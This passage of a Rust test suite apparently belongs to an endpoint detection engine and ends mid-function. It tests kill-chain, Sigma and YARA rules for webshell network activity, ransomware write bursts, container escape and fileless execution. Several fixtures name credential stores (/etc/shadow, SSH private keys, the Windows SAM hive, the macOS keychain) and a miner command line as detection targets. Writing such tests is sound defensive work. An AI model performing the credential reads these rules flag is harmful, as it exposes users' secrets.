// AC-DET-050 AC-DET-088
fn layer4_pid_reuse_does_not_inherit_stale_non_web_network_signal() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
    parent.pid = 60;
    parent.ppid = 1;
    parent.session_id = parent.pid;
    let _ = l4.observe(&parent);

    let mut child = event(2, EventClass::ProcessExec, "bash", "nginx", 33);
    child.pid = 61;
    child.ppid = 60;
    child.session_id = child.pid;
    let _ = l4.observe(&child);

    let mut malicious_net = event(3, EventClass::NetworkConnect, "bash", "nginx", 33);
    malicious_net.pid = 61;
    malicious_net.ppid = 60;
    malicious_net.session_id = malicious_net.pid;
    malicious_net.dst_port = Some(9001);
    let hits = l4.observe(&malicious_net);
    assert!(hits.iter().any(|h| h == "killchain_webshell_network"));

    // Simulate PID reuse / new process image: process_exec on same pid must reset stale runtime flags.
    let mut reused_pid_exec = event(20, EventClass::ProcessExec, "bash", "nginx", 33);
    reused_pid_exec.pid = 61;
    reused_pid_exec.ppid = 60;
    reused_pid_exec.session_id = reused_pid_exec.pid;
    let reuse_hits = l4.observe(&reused_pid_exec);
    assert!(
        reuse_hits.iter().all(|h| h != "killchain_webshell_network"),
        "reused pid inherited stale network_non_web signal"
    );

    let mut benign_net = event(22, EventClass::NetworkConnect, "bash", "nginx", 33);
    benign_net.pid = 61;
    benign_net.ppid = 60;
    benign_net.session_id = benign_net.pid;
    benign_net.dst_port = Some(443);
    let benign_hits = l4.observe(&benign_net);
    assert!(
        benign_hits
            .iter()
            .all(|h| h != "killchain_webshell_network"),
        "reused pid produced stale hit on benign web traffic"
    );
}

#[test]
// AC-DET-050 AC-DET-088
fn layer4_process_exit_tears_down_node_and_ignores_stale_out_of_order_exit() {
    let mut l4 = Layer4Engine::with_capacity(300, 16, 16);

    let mut proc = event(10, EventClass::ProcessExec, "bash", "init", 1000);
    proc.pid = 700;
    proc.ppid = 1;
    proc.session_id = proc.pid;
    let _ = l4.observe(&proc);
    assert!(l4.debug_contains_pid(700));

    let mut stale_exit = event(9, EventClass::ProcessExit, "bash", "init", 1000);
    stale_exit.pid = 700;
    stale_exit.ppid = 1;
    stale_exit.session_id = stale_exit.pid;
    let _ = l4.observe(&stale_exit);
    assert!(
        l4.debug_contains_pid(700),
        "stale out-of-order process_exit should be ignored"
    );

    let mut fresh_exit = event(11, EventClass::ProcessExit, "bash", "init", 1000);
    fresh_exit.pid = 700;
    fresh_exit.ppid = 1;
    fresh_exit.session_id = fresh_exit.pid;
    let _ = l4.observe(&fresh_exit);
    assert!(!l4.debug_contains_pid(700));

    let counters = l4.debug_eviction_counters();
    assert_eq!(counters.retention_prune, 0);
    assert_eq!(counters.node_cap_evict, 0);
    assert_eq!(counters.edge_cap_evict, 0);
}

#[test]
// AC-DET-054 AC-DET-088
fn layer4_node_capacity_evicts_oldest_then_lowest_pid_deterministically() {
    let mut l4 = Layer4Engine::with_capacity(300, 2, 16);

    let mut first = event(1, EventClass::ProcessExec, "bash", "init", 1000);
    first.pid = 410;
    first.ppid = 1;
    first.session_id = first.pid;
    let _ = l4.observe(&first);

    let mut second = event(1, EventClass::ProcessExec, "bash", "init", 1000);
    second.pid = 405;
    second.ppid = 1;
    second.session_id = second.pid;
    let _ = l4.observe(&second);

    let mut third = event(2, EventClass::ProcessExec, "bash", "init", 1000);
    third.pid = 420;
    third.ppid = 1;
    third.session_id = third.pid;
    let _ = l4.observe(&third);

    assert_eq!(l4.debug_graph_node_count(), 2);
    assert!(l4.debug_contains_pid(410));
    assert!(l4.debug_contains_pid(420));
    assert!(
        !l4.debug_contains_pid(405),
        "oldest timestamp tie should evict lowest pid deterministically"
    );

    let counters = l4.debug_eviction_counters();
    assert_eq!(counters.node_cap_evict, 1);
    assert_eq!(counters.edge_cap_evict, 0);
}

#[test]
#[cfg(all(test, not(miri)))]
// AC-DET-054 AC-DET-088
fn layer4_edge_capacity_evicts_oldest_nodes_until_edge_budget_is_met() {
    let mut l4 = Layer4Engine::with_capacity(300, 16, 2);

    let mut root = event(1, EventClass::ProcessExec, "root", "init", 1000);
    root.pid = 500;
    root.ppid = 1;
    root.session_id = root.pid;
    let _ = l4.observe(&root);

    let mut child_a = event(2, EventClass::ProcessExec, "child-a", "root", 1000);
    child_a.pid = 501;
    child_a.ppid = 500;
    child_a.session_id = child_a.pid;
    let _ = l4.observe(&child_a);
    assert_eq!(l4.debug_graph_edge_count(), 2);

    let mut child_b = event(3, EventClass::ProcessExec, "child-b", "root", 1000);
    child_b.pid = 502;
    child_b.ppid = 500;
    child_b.session_id = child_b.pid;
    let _ = l4.observe(&child_b);

    assert!(
        !l4.debug_contains_pid(500),
        "oldest root should be evicted when edge budget is exceeded"
    );
    assert!(l4.debug_contains_pid(501));
    assert!(l4.debug_contains_pid(502));
    assert!(l4.debug_graph_edge_count() <= 1);

    let counters = l4.debug_eviction_counters();
    assert_eq!(counters.edge_cap_evict, 1);
}

#[test]
// AC-DET-052 AC-DET-088
fn layer4_template_matching_is_bounded_by_declared_depth() {
    let mut l4 = Layer4Engine::new(300);
    l4.add_template(KillChainTemplate {
        name: "bounded_depth_chain".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: Some(crate::util::set_of(["root"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: Some(crate::util::set_of(["mid"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: Some(crate::util::set_of(["leaf"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: true,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 1,
        max_inter_stage_secs: 30,
    });

    let mut root = event(1, EventClass::ProcessExec, "root", "systemd", 1000);
    root.pid = 10;
    root.ppid = 1;
    root.session_id = root.pid;
    let _ = l4.observe(&root);

    let mut mid = event(2, EventClass::ProcessExec, "mid", "root", 1000);
    mid.pid = 11;
    mid.ppid = 10;
    mid.session_id = mid.pid;
    let _ = l4.observe(&mid);

    let mut leaf = event(3, EventClass::NetworkConnect, "leaf", "mid", 1000);
    leaf.pid = 12;
    leaf.ppid = 11;
    leaf.session_id = leaf.pid;
    leaf.dst_port = Some(9001);
    let hits = l4.observe(&leaf);
    assert!(hits.iter().all(|h| h != "bounded_depth_chain"));
}

#[test]
#[cfg_attr(miri, ignore = "graph pruning stress test is too slow under miri")]
// AC-DET-054
fn layer4_graph_state_is_pruned_by_sliding_window_to_stay_bounded() {
    let mut l4 = Layer4Engine::new(10);

    let node_count: u32 = if cfg!(miri) { 128 } else { 1_000 };
    for i in 0..node_count {
        let mut ev = event(0, EventClass::ProcessExec, "bash", "init", 1000);
        ev.pid = 10_000 + i;
        ev.ppid = 1;
        ev.session_id = ev.pid;
        let _ = l4.observe(&ev);
    }

    let mut now = event(1_000, EventClass::ProcessExec, "bash", "init", 1000);
    now.pid = 99_999;
    now.ppid = 1;
    now.session_id = now.pid;
    let _ = l4.observe(&now);

    assert!(l4.debug_graph_node_count() <= 2);
    assert!(
        l4.debug_eviction_counters().retention_prune > 0,
        "retention prune counter should track stale graph eviction"
    );
}

#[test]
#[cfg_attr(
    miri,
    ignore = "runtime envelope assertions are not meaningful under miri"
)]
// AC-DET-053
fn layer4_evaluation_runtime_is_bounded_with_depth_limited_templates() {
    let mut l4 = Layer4Engine::new(300);
    for idx in 0..64 {
        l4.add_template(KillChainTemplate {
            name: format!("template-{idx}"),
            stages: vec![
                TemplatePredicate {
                    process_any_of: None,
                    uid_eq: None,
                    uid_ne: None,
                    require_network_non_web: false,
                    require_module_loaded: false,
                    require_sensitive_file_access: false,
                    require_ransomware_write_burst: false,
                    require_container_escape: false,
                    require_privileged_container: false,
                    require_ptrace_activity: false,
                    require_userfaultfd_activity: false,
                    require_execveat_activity: false,
                    require_proc_mem_access: false,
                    require_fileless_exec: false,
                },
                TemplatePredicate {
                    process_any_of: Some(std::iter::once("never-match".to_string()).collect()),
                    uid_eq: None,
                    uid_ne: None,
                    require_network_non_web: true,
                    require_module_loaded: false,
                    require_sensitive_file_access: false,
                    require_ransomware_write_burst: false,
                    require_container_escape: false,
                    require_privileged_container: false,
                    require_ptrace_activity: false,
                    require_userfaultfd_activity: false,
                    require_execveat_activity: false,
                    require_proc_mem_access: false,
                    require_fileless_exec: false,
                },
            ],
            max_depth: 6,
            max_inter_stage_secs: 30,
        });
    }

    for depth in 0..200u32 {
        let mut ev = event(depth as i64, EventClass::ProcessExec, "bash", "bash", 1000);
        ev.pid = 20_000 + depth;
        ev.ppid = if depth == 0 { 1 } else { 19_999 + depth };
        ev.session_id = ev.pid;
        let _ = l4.observe(&ev);
    }

    let mut trigger = event(201, EventClass::NetworkConnect, "bash", "bash", 1000);
    trigger.pid = 20_199;
    trigger.ppid = 20_198;
    trigger.session_id = trigger.pid;
    trigger.dst_port = Some(9_001);

    let started = std::time::Instant::now();
    let hits = l4.observe(&trigger);
    assert!(hits.is_empty());
    assert!(started.elapsed() < std::time::Duration::from_millis(500));
    assert_eq!(l4.debug_template_count(), 64);
}

#[test]
fn engine_runs_all_layers() {
    let mut d = DetectionEngine::default_with_rules();
    d.layer1.load_hashes(["deadbeef".to_string()]);

    let mut ev = event(1, EventClass::ProcessExec, "bash", "sshd", 1000);
    ev.file_hash = Some("deadbeef".to_string());
    ev.session_id = ev.pid;
    let out = d.process_event(&ev);
    assert_eq!(out.confidence, Confidence::Definite);
}

#[test]
// AC-DET-190 AC-DET-191 AC-DET-192 AC-DET-193
fn ransomware_write_burst_triggers_killchain_and_ignores_sparse_writes() {
    let mut l4 = Layer4Engine::with_default_templates();

    for i in 0..10 {
        let mut ev = event(i, EventClass::FileOpen, "python", "systemd", 1000);
        ev.pid = 5050;
        ev.ppid = 1;
        ev.session_id = ev.pid;
        ev.file_path = Some("/home/user/docs/report.txt".to_string());
        ev.file_write = true;
        let hits = l4.observe(&ev);
        assert!(
            hits.iter().all(|h| h != "killchain_ransomware_write_burst"),
            "sparse writes should not trigger ransomware killchain"
        );
    }

    let mut triggered = false;
    for i in 0..30 {
        let ts = 200 + (i / 2);
        let mut ev = event(ts, EventClass::FileOpen, "python", "systemd", 1000);
        ev.pid = 6060;
        ev.ppid = 1;
        ev.session_id = ev.pid;
        ev.file_path = Some("C:\\Users\\alice\\Documents\\budget.xlsx".to_string());
        ev.file_write = true;
        let hits = l4.observe(&ev);
        if hits.iter().any(|h| h == "killchain_ransomware_write_burst") {
            triggered = true;
            break;
        }
    }

    assert!(
        triggered,
        "write burst in user data path should trigger ransomware killchain"
    );

    let mut restricted_policy = RansomwarePolicy::default();
    restricted_policy.adaptive_min_samples = 0;
    restricted_policy.adaptive_floor = restricted_policy.write_threshold;
    restricted_policy.user_path_prefixes = vec!["/data/".to_string()];
    let mut l4_restricted =
        Layer4Engine::with_capacity_and_policy(300, 8_192, 32_768, restricted_policy);
    for i in 0..30 {
        let ts = 800 + (i / 2);
        let mut ev = event(ts, EventClass::FileOpen, "python", "systemd", 1000);
        ev.pid = 8080;
        ev.ppid = 1;
        ev.session_id = ev.pid;
        ev.file_path = Some("/home/user/docs/notes.txt".to_string());
        ev.file_write = true;
        let hits = l4_restricted.observe(&ev);
        assert!(
            hits.iter().all(|h| h != "killchain_ransomware_write_burst"),
            "policy override should suppress default user path matches"
        );
    }

    let mut temp_ev = event(500, EventClass::FileOpen, "python", "systemd", 1000);
    temp_ev.pid = 7070;
    temp_ev.ppid = 1;
    temp_ev.session_id = temp_ev.pid;
    temp_ev.file_path = Some("/tmp/evil.enc".to_string());
    temp_ev.file_write = true;
    let hits = l4.observe(&temp_ev);
    assert!(
        hits.iter().all(|h| h != "killchain_ransomware_write_burst"),
        "temp/system paths should not count toward ransomware burst"
    );

    let mut adaptive_policy = RansomwarePolicy::default();
    adaptive_policy.write_threshold = 100;
    adaptive_policy.adaptive_min_samples = 1;
    adaptive_policy.adaptive_floor = 8;
    adaptive_policy.adaptive_delta = 0.5;
    let mut l4_adaptive =
        Layer4Engine::with_capacity_and_policy(300, 8_192, 32_768, adaptive_policy);
    l4_adaptive.add_template(KillChainTemplate {
        name: "killchain_ransomware_write_burst".to_string(),
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: None,
            require_network_non_web: false,
            require_module_loaded: false,
            require_sensitive_file_access: false,
            require_ransomware_write_burst: true,
            require_container_escape: false,
            require_privileged_container: false,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
        max_depth: 2,
        max_inter_stage_secs: 15,
    });

    for i in 0..10 {
        let mut ev = event(1000 + i, EventClass::FileOpen, "python", "systemd", 1000);
        ev.pid = 9300;
        ev.ppid = 1;
        ev.session_id = ev.pid;
        ev.file_path = Some("/home/user/docs/note.txt".to_string());
        ev.file_write = true;
        let _ = l4_adaptive.observe(&ev);
    }

    for i in 0..5 {
        let mut ev = event(3000 + i, EventClass::FileOpen, "python", "systemd", 1000);
        ev.pid = 9300;
        ev.ppid = 1;
        ev.session_id = ev.pid;
        ev.file_path = Some("/data/projects/alpha/report.docx".to_string());
        ev.file_write = true;
        let _ = l4_adaptive.observe(&ev);
    }

    let mut ev = event(3050, EventClass::FileOpen, "python", "systemd", 1000);
    ev.pid = 9300;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.file_path = Some("/data/projects/alpha/report.docx".to_string());
    ev.file_write = true;
    let _ = l4_adaptive.observe(&ev);

    let mut triggered_learned = false;
    for i in 0..15 {
        let mut ev = event(3070 + i, EventClass::FileOpen, "python", "systemd", 1000);
        ev.pid = 9300;
        ev.ppid = 1;
        ev.session_id = ev.pid;
        ev.file_path = Some("/data/projects/beta/output.bin".to_string());
        ev.file_write = true;
        let hits = l4_adaptive.observe(&ev);
        if hits.iter().any(|h| h == "killchain_ransomware_write_burst") {
            triggered_learned = true;
            break;
        }
    }

    assert!(
        triggered_learned,
        "learned roots should allow non-default user paths"
    );
}

#[test]
// AC-DET-210
fn container_escape_killchain_triggers() {
    let mut l4 = Layer4Engine::with_default_templates();
    let mut ev = event(10, EventClass::ProcessExec, "sleep", "init", 0);
    ev.pid = 4242;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.container_runtime = Some("docker".to_string());
    ev.container_id = Some("deadbeefdead".to_string());
    ev.container_escape = true;

    let hits = l4.observe(&ev);
    assert!(
        hits.iter().any(|h| h == "killchain_container_escape"),
        "container escape should trigger killchain"
    );
}

#[test]
// AC-DET-211
fn privileged_container_killchain_triggers() {
    let mut l4 = Layer4Engine::with_default_templates();
    let mut ev = event(20, EventClass::ProcessExec, "sleep", "init", 0);
    ev.pid = 5252;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.container_runtime = Some("docker".to_string());
    ev.container_id = Some("cafebabecafe".to_string());
    ev.container_privileged = true;

    let hits = l4.observe(&ev);
    assert!(
        hits.iter().any(|h| h == "killchain_container_privileged"),
        "privileged container should trigger killchain"
    );
}

#[test]
// AC-DET-212
fn credential_theft_killchain_triggers_on_sensitive_paths() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut shadow = event(10, EventClass::FileOpen, "cat", "bash", 1000);
    shadow.pid = 6100;
    shadow.ppid = 1;
    shadow.session_id = shadow.pid;
    shadow.file_path = Some("/etc/shadow".to_string());
    let hits = l4.observe(&shadow);
    assert!(
        hits.iter().any(|h| h == "killchain_credential_theft"),
        "credential theft should trigger on /etc/shadow"
    );

    let mut key = event(11, EventClass::FileOpen, "cat", "bash", 1000);
    key.pid = 6101;
    key.ppid = 1;
    key.session_id = key.pid;
    key.file_path = Some("/root/.ssh/id_rsa".to_string());
    let hits = l4.observe(&key);
    assert!(
        hits.iter().any(|h| h == "killchain_credential_theft"),
        "credential theft should trigger on SSH private keys"
    );
}

#[test]
// AC-DET-213
fn credential_theft_killchain_ignores_root_access() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut ev = event(12, EventClass::FileOpen, "cat", "bash", 0);
    ev.pid = 6200;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.file_path = Some("/etc/shadow".to_string());

    let hits = l4.observe(&ev);
    assert!(
        !hits.iter().any(|h| h == "killchain_credential_theft"),
        "root access should not trigger credential theft killchain"
    );
}

#[test]
// AC-DET-214
fn credential_theft_killchain_triggers_on_windows_paths() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut ev = event(13, EventClass::FileOpen, "powershell", "explorer", 1000);
    ev.pid = 6300;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.file_path = Some("C:\\Windows\\System32\\config\\SAM".to_string());

    let hits = l4.observe(&ev);
    assert!(
        hits.iter().any(|h| h == "killchain_credential_theft"),
        "windows SAM access should trigger credential theft killchain"
    );
}

#[test]
// AC-DET-215
fn credential_theft_killchain_triggers_on_macos_paths() {
    let mut l4 = Layer4Engine::with_default_templates();

    let mut ev = event(14, EventClass::FileOpen, "security", "launchd", 1000);
    ev.pid = 6400;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.file_path = Some("/Library/Keychains/login.keychain-db".to_string());

    let hits = l4.observe(&ev);
    assert!(
        hits.iter().any(|h| h == "killchain_credential_theft"),
        "macOS keychain access should trigger credential theft killchain"
    );
}

#[test]
// AC-DET-217
fn exploit_indicator_memfd_triggers_high_confidence() {
    let mut engine = DetectionEngine::default_with_rules();

    let mut ev = event(20, EventClass::ProcessExec, "memfd", "init", 1000);
    ev.pid = 7100;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.file_path = Some("memfd:payload (deleted)".to_string());

    let out = engine.process_event(&ev);
    assert!(out.signals.exploit_indicator);
    assert!(out.exploit_indicators.iter().any(|v| v == "fileless_memfd"));
    assert_eq!(out.confidence, Confidence::High);
}

#[test]
// AC-DET-218
fn exploit_indicator_procfd_triggers_high_confidence() {
    let mut engine = DetectionEngine::default_with_rules();

    let mut ev = event(21, EventClass::ProcessExec, "fdexec", "init", 1000);
    ev.pid = 7200;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.file_path = Some("/proc/self/fd/3".to_string());

    let out = engine.process_event(&ev);
    assert!(out.signals.exploit_indicator);
    assert!(out
        .exploit_indicators
        .iter()
        .any(|v| v == "fileless_procfd"));
    assert_eq!(out.confidence, Confidence::High);
}

#[test]
// AC-DET-219
fn exploit_indicator_tmp_interpreter_triggers_high_confidence() {
    let mut engine = DetectionEngine::default_with_rules();

    let mut ev = event(22, EventClass::ProcessExec, "python", "init", 1000);
    ev.pid = 7300;
    ev.ppid = 1;
    ev.session_id = ev.pid;
    ev.file_path = Some("/tmp/evil".to_string());
    ev.command_line = Some("python -c 'print(1)'".to_string());

    let out = engine.process_event(&ev);
    assert!(out.signals.exploit_indicator);
    assert!(out
        .exploit_indicators
        .iter()
        .any(|v| v == "fileless_tmp_interpreter"));
    assert_eq!(out.confidence, Confidence::High);
}

#[test]
// AC-DET-080
fn detection_outcome_includes_rule_names_and_matched_fields_for_traceability() {
    let mut engine = DetectionEngine::default_with_rules();
    engine.layer1.load_hashes(["deadbeef".to_string()]);

    let mut first = event(1, EventClass::ProcessExec, "bash", "nginx", 1000);
    first.pid = 700;
    first.file_hash = Some("deadbeef".to_string());
    first.session_id = first.pid;
    let first_out = engine.process_event(&first);
    assert!(first_out
        .layer1
        .matched_fields
        .iter()
        .any(|f| f == "file_hash"));

    let mut second = event(2, EventClass::NetworkConnect, "bash", "nginx", 1000);
    second.pid = 700;
    second.session_id = second.pid;
    second.dst_port = Some(9001);
    let second_out = engine.process_event(&second);
    assert!(second_out.temporal_hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
// AC-DET-023
fn sigma_yaml_rule_compiles_and_fires() {
    let sigma_yaml = r#"
title: sigma_webshell_network
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash]
      parent_any_of: [nginx]
      within_secs: 30
    - event_class: network_connect
      dst_port_not_in: [80, 443]
      file_path_any_of: None,
      file_path_contains: None,
      within_secs: 10
"#;

    let mut t = TemporalEngine::new();
    let name = t
        .add_sigma_rule_yaml(sigma_yaml)
        .expect("compile sigma rule");
    assert_eq!(name, "sigma_webshell_network");

    let mut e1 = event(10, EventClass::ProcessExec, "bash", "nginx", 33);
    e1.pid = 404;
    e1.session_id = e1.pid;
    assert!(t.observe(&e1).is_empty());

    let mut e2 = event(15, EventClass::NetworkConnect, "bash", "nginx", 33);
    e2.pid = 404;
    e2.session_id = e2.pid;
    e2.dst_port = Some(8443);
    let hits = t.observe(&e2);
    assert!(hits.iter().any(|v| v == "sigma_webshell_network"));
}

#[test]
// AC-DET-216
fn sigma_yaml_file_path_predicate_compiles_and_fires() {
    let sigma_yaml = r#"
title: sigma_credential_access
id: sigma_credential_access

detection:
  sequence:
    - event_class: file_open
      file_path_any_of: [/etc/shadow]
      file_path_contains: ["/.ssh/id_rsa"]
      within_secs: 10
"#;

    let mut engine = TemporalEngine::new();
    let name = engine
        .add_sigma_rule_yaml(sigma_yaml)
        .expect("compile sigma rule");
    assert_eq!(name, "sigma_credential_access");

    let mut e1 = event(10, EventClass::FileOpen, "cat", "bash", 1000);
    e1.pid = 777;
    e1.session_id = e1.pid;
    e1.file_path = Some("/etc/shadow".to_string());
    let hits = engine.observe(&e1);
    assert!(hits.iter().any(|v| v == "sigma_credential_access"));

    let mut e2 = event(11, EventClass::FileOpen, "cat", "bash", 1000);
    e2.pid = 778;
    e2.session_id = e2.pid;
    e2.file_path = Some("/home/user/.ssh/id_rsa".to_string());
    let hits = engine.observe(&e2);
    assert!(hits.iter().any(|v| v == "sigma_credential_access"));
}

#[test]
// AC-DET-023 AC-DET-171
fn sigma_legacy_selection_compiles_and_fires_on_command_line() {
    let sigma_yaml = r#"
title: sigma_legacy_cmdline
logsource:
  product: linux
  service: auditd

detection:
  selection:
    Image|endswith:
      - '/bash'
    CommandLine|contains:
      - '--cpu-priority'
  condition: selection
"#;

    let mut engine = TemporalEngine::new();
    let name = engine
        .add_sigma_rule_yaml(sigma_yaml)
        .expect("compile legacy sigma rule");
    assert_eq!(name, "sigma_legacy_cmdline");

    let mut e = event(10, EventClass::ProcessExec, "bash", "sshd", 1000);
    e.pid = 901;
    e.session_id = e.pid;
    e.command_line = Some("bash --cpu-priority 5 --foo".to_string());
    let hits = engine.observe(&e);
    assert!(hits.iter().any(|v| v == "sigma_legacy_cmdline"));
}

#[test]
// AC-DET-023 AC-DET-171
fn sigma_legacy_condition_one_of_prefix_compiles_and_fires() {
    let sigma_yaml = r#"
title: sigma_legacy_one_of
logsource:
  product: linux
  service: auditd

detection:
  cmd1:
    a1|startswith: '--cpu-priority'
  cmd2:
    a2|startswith: '--cpu-priority'
  condition: 1 of cmd*
"#;

    let mut engine = TemporalEngine::new();
    let name = engine
        .add_sigma_rule_yaml(sigma_yaml)
        .expect("compile legacy one-of sigma rule");
    assert_eq!(name, "sigma_legacy_one_of");

    let mut e = event(11, EventClass::ProcessExec, "bash", "sshd", 1000);
    e.pid = 902;
    e.session_id = e.pid;
    e.command_line = Some("/usr/bin/miner --cpu-priority 4".to_string());
    let hits = engine.observe(&e);
    assert!(hits.iter().any(|v| v == "sigma_legacy_one_of"));
}

#[test]
// AC-DET-023
fn sigma_yaml_missing_within_secs_is_rejected() {
    let sigma_yaml = r#"
title: invalid_rule
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash]
"#;

    let err = compile_sigma_rule(sigma_yaml).expect_err("expected compile error");
    assert!(matches!(
        err,
        SigmaCompileError::MissingStageWindow { stage_index: 0 }
    ));
}

#[test]
// AC-DET-023
fn sigma_yaml_compiles_to_bounded_temporal_ast() {
    let sigma_yaml = r#"
title: sigma_ast_example
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash]
      within_secs: 30
    - event_class: network_connect
      dst_port_not_in: [80, 443]
      file_path_any_of: None,
      file_path_contains: None,
      within_secs: 10
"#;

    let ast = compile_sigma_ast(sigma_yaml).expect("compile sigma ast");
    assert_eq!(ast.stages.len(), 2);
    assert_eq!(ast.name, "sigma_ast_example");

    match ast.root {
        TemporalExpr::And(_, rhs) => match *rhs {
            TemporalExpr::EventuallyWithin { within_secs, .. } => {
                assert_eq!(within_secs, 10)
            }
            other => panic!("unexpected rhs expression: {:?}", other),
        },
        other => panic!("unexpected root expression: {:?}", other),
    }
}

#[test]
fn yara_rule_match_escalates_to_definite() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_yara_rules_str(
            r#"
rule suspicious_payload {
  strings:
    $a = "malware-test-marker"
  condition:
    $a
}
"#,
        )
        .expect("load yara rules");

    let mut ev = event(1, EventClass::ProcessExec, "bash", "sshd", 1000);
    ev.command_line = Some("echo malware-test-marker".to_string());
    let out = engine.process_event(&ev);

    assert_eq!(out.confidence, Confidence::Definite);
    assert!(out
        .yara_hits
        .iter()
        .any(|hit| hit.rule_name == "suspicious_payload"));
}

#[test]
fn sigma_rules_load_from_directory() {
    let base = std::env::temp_dir().join(format!(
        "eguard-sigma-rules-{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or_default()
    ));
    std::fs::create_dir_all(&base).expect("create sigma dir");

    let path = base.join("rule.yml");
    std::fs::write(
        &path,
        r#"
title: sigma_rule_from_dir
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash]
      parent_any_of: [nginx]
      within_secs: 30
    - event_class: network_connect
      dst_port_not_in: [80, 443]
      file_path_any_of: None,
      file_path_contains: None,
      within_secs: 10
"#,
    )
    .expect("write sigma rule");

    let mut engine = DetectionEngine::default_with_rules();
    let loaded = engine
        .load_sigma_rules_from_dir(&base)
        .expect("load sigma directory");
    assert_eq!(loaded, 1);

    let _ = std::fs::remove_file(path);
    let _ = std::fs::remove_dir(base);
}

#[test]
// AC-DET-079 AC-DET-090
fn replay_harness_is_deterministic() {
    let events = vec![
        event(1, EventClass::ProcessExec, "bash", "nginx", 33),
        {
            let mut e = event(2, EventClass::NetworkConnect, "bash", "nginx", 33);
            e.dst_port = Some(8443);
            e
        },
        {
            let mut e = event(3, EventClass::ProcessExec, "bash", "sshd", 1000);
            e.file_hash = Some("deadbeef".to_string());
            e
        },
    ];

    let mut engine_a = DetectionEngine::default_with_rules();
    engine_a.layer1.load_hashes(["deadbeef".to_string()]);
    let out_a = replay_events(&mut engine_a, &events);

    let mut engine_b = DetectionEngine::default_with_rules();
    engine_b.layer1.load_hashes(["deadbeef".to_string()]);
    let out_b = replay_events(&mut engine_b, &events);

    assert_eq!(out_a, out_b);
    assert_eq!(out_a.total_events, 3);
    assert!(out_a.alerts.len() >= 2);
    assert!(out_a.definite >= 1);
}

#[test]
// AC-DET-095
fn drift_indicators_report_baseline_age_and_kl_quantiles_by_process_family() {
    let anomaly = AnomalyEngine::new(AnomalyConfig {
        window_size: 4,
        tau_floor_high: 10.0,
        tau_floor_med: 0.0,
        delta_high: 1.0,
        delta_med: 1.0,
        min_entropy_len: 8,
        entropy_threshold: 0.1,
        entropy_z_threshold: -0.1,
        ..AnomalyConfig::default()
    });
    let mut engine = DetectionEngine::new(
        IocLayer1::new(),
        TemporalEngine::with_default_rules(),
        anomaly,
        Layer4Engine::with_default_templates(),
    );

    let mut baseline = HashMap::new();
    baseline.insert(EventClass::ProcessExec, 0.95);
    baseline.insert(EventClass::NetworkConnect, 0.05);
    engine
        .layer3
        .set_baseline("python:bash".to_string(), baseline);

    let mut events = Vec::new();
    for ts in 0..16 {
        let mut ev = event(ts, EventClass::ProcessExec, "python", "bash", 1000);
        ev.command_line = Some(format!("Ab9$Xy2!Qw8#Tn6@-{ts:02}"));
        events.push(ev);
    }

    let drift = report_drift_indicators(&mut engine, &events, 100, 190);
    assert_eq!(drift.baseline_age_secs, 90);

    let q = drift
        .kl_quantiles_by_process_family
        .get("python:bash")
        .expect("quantiles for process family");
    assert!(q.p50_kl_bits >= 0.0);
    assert!(q.p95_kl_bits >= q.p50_kl_bits);
}

#[test]
#[cfg_attr(
    miri,
    ignore = "spawning rustc/cargo subprocesses is unsupported under miri"
)]
// AC-DET-182
fn detection_workspace_excludes_ml_framework_dependencies() {
    #[derive(serde::Deserialize)]
    struct Metadata {
        packages: Vec<MetadataPackage>,
        resolve: Option<MetadataResolve>,
    }

    #[derive(serde::Deserialize)]
    struct MetadataPackage {
        id: String,
        name: String,
    }

    #[derive(serde::Deserialize)]
    struct MetadataResolve {
        nodes: Vec<MetadataNode>,
    }

    #[derive(serde::Deserialize)]
    struct MetadataNode {
        id: String,
    }

    let rustc_output = std::process::Command::new("rustc")
        .arg("-vV")
        .output()
        .expect("run rustc -vV");
    assert!(
        rustc_output.status.success(),
        "rustc -vV failed (status={}): {}",
        rustc_output.status,
        String::from_utf8_lossy(&rustc_output.stderr)
    );

    let rustc_stdout = String::from_utf8(rustc_output.stdout).expect("rustc -vV stdout is UTF-8");
    let host_triple = rustc_stdout
        .lines()
